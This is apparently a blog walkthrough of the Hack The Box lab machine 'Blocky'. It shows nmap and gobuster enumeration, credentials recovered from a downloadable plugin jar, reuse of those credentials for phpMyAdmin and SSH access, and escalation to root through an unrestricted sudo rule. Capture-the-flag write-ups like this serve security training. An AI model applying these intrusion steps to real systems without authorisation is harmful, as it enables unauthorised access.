---
layout: walkthrough
title: Blocky
description: HTB walkthrough
logo: /assets/img/walkthroughs/blocky_logo.png
show-avatar: false
permalink: /walkthroughs/blocky.html
OS: Linux
difficulty: Easy
release: 21 Jul 2017
creator: <a href="https://www.hackthebox.eu/home/users/profile/2904">Arrexel</a>
cleared: 3 Nov 2019
published: 2019 11 03
---

<h2 align="center">Enumeration</h2>
Starting with a standard nmap scan...

```
# Nmap 7.80 scan initiated Fri Nov  1 19:17:36 2019 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.098s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 19:20:49 2019 -- 1 IP address (1 host up) scanned in 192.23 seconds

```

We see there is a wordpress page running on port 80

<img src="/assets/img/walkthroughs/blocky_wordpress.png" alt="wordpress" style="zoom: 50%;" />



Running 

```sh
gobuster dir -w <wordlist> -x .php,.txt -o <outputfile> -u http://10.10.10.37
```

with the appropriate wordlist yielded the following results

```sh
/index.php (Status: 301)
/wiki (Status: 301)
/wp-content (Status: 301)
/wp-login.php (Status: 200)
/plugins (Status: 301)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/wp-signup.php (Status: 302)
/server-status (Status: 403)
```

We see several interesting possibilities for further enumeration and exploit paths, what we need  however is in /plugins

![plugins](/assets/img/walkthroughs/blocky_plugins.png)

downloading both these files and looking at them with **jd-gui** shows us the following

![blockycore](/assets/img/walkthroughs/blocky_blockycore.png)

This login and password will get us into the phpmyadmin portal, where we can look at the mySQL wordpress users table and find there is a user named **notch**, or more simply we can direct our browser to http://10.10.10.37/?author=1 and get the user name there.

This user and pass gives us login to FTP and SSH. We obviously login to SSH. We can then read the user.txt file.

Gaining root is as simple as running "sudo -l" and seeing the notch can run everything as root, and then switching to root, which we can do as we have notch's password

```
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# whoami
root
root@Blocky:/home/notch# 

```

which gives us access to the root.txt flag.
